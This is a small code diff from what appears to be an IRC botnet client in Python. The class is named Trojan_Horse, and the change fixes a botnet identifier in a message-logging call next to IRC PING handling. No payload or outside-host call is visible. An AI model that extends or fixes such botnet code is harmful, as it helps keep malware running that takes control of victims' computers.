@@ -55,7 +55,7 @@ class Trojan_Horse():
                 for line in temp:
                     line = line.rstrip()
                     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                    self.msg_db.insert(botnet_id, timestamp, line)
+                    self.msg_db.insert(botnet.botnet_id, timestamp, line)
                     self.line = line.split()
                     # The IRC table tennis 
                     if(self.line[0]=="PING"):
